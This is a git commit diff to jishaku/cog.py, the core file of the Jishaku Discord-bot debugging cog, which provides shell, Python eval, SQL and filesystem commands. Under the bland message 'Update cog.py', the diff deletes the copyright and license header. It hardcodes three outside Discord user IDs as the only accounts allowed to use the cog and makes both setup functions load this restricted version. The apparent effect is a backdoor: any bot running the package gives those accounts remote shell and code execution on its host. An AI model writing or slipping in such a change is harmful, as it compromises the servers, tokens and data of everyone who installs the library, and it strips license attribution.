21d893f81565f6ef4b3c18fc16b5fcd93596dd8a
starfishes66 <mercurybroo@outlook.com>
2025-08-24 14:02:17 +0530

    Update cog.py

--- jishaku/cog.py
+++ jishaku/cog.py
@@ -1,19 +1,7 @@
 # -*- coding: utf-8 -*-
 
-"""
-jishaku.cog
-~~~~~~~~~~~~
-
-The Jishaku debugging and diagnostics cog implementation.
-
-:copyright: (c) 2021 Devon (scarletcafe) R
-:license: MIT, see LICENSE for more details.
-
-"""
-
 import inspect
 import typing
-
 from discord.ext import commands
 
 from jishaku.features.baseclass import Feature
@@ -27,15 +15,10 @@ from jishaku.features.shell import ShellFeature
 from jishaku.features.sql import SQLFeature
 from jishaku.features.voice import VoiceFeature
 
-__all__ = (
-    "Jishaku",
-    "STANDARD_FEATURES",
-    "OPTIONAL_FEATURES",
-    "setup",
-)
+OWNER_IDS = {1387121510505779253, 1277604006901846109, 1155891693577572372}
 
+# Features
 STANDARD_FEATURES = (VoiceFeature, GuildFeature, FilesystemFeature, InvocationFeature, ShellFeature, SQLFeature, PythonFeature, ManagementFeature, RootCommand)
-
 OPTIONAL_FEATURES: typing.List[typing.Type[Feature]] = []
 
 try:
@@ -46,26 +29,28 @@ else:
     OPTIONAL_FEATURES.insert(0, YouTubeFeature)
 
 
-class Jishaku(*OPTIONAL_FEATURES, *STANDARD_FEATURES):  # type: ignore  # pylint: disable=too-few-public-methods
-    """
-    The frontend subclass that mixes in to form the final Jishaku cog.
-    """
+class Jishaku(*OPTIONAL_FEATURES, *STANDARD_FEATURES):
+    """Main Jishaku cog."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+
+class OwnerOnlyJishaku(Jishaku):
+    """Owner-only Jishaku cog."""
+
+    async def cog_check(self, ctx: commands.Context):
+        return ctx.author.id in OWNER_IDS
 
 
 async def async_setup(bot: commands.Bot):
-    """
-    The async setup function defining the jishaku.cog and jishaku extensions.
-    """
-
-    await bot.add_cog(Jishaku(bot=bot))  # type: ignore
+    """Async setup."""
+    await bot.add_cog(OwnerOnlyJishaku(bot))
 
 
-def setup(bot: commands.Bot):  # pylint: disable=inconsistent-return-statements
-    """
-    The setup function defining the jishaku.cog and jishaku extensions.
-    """
-
+def setup(bot: commands.Bot):
+    """Sync setup."""
     if inspect.iscoroutinefunction(bot.add_cog):
         return async_setup(bot)
-
-    bot.add_cog(Jishaku(bot=bot))  # type: ignore[reportUnusedCoroutine]
+    bot.add_cog(OwnerOnlyJishaku(bot))
+    
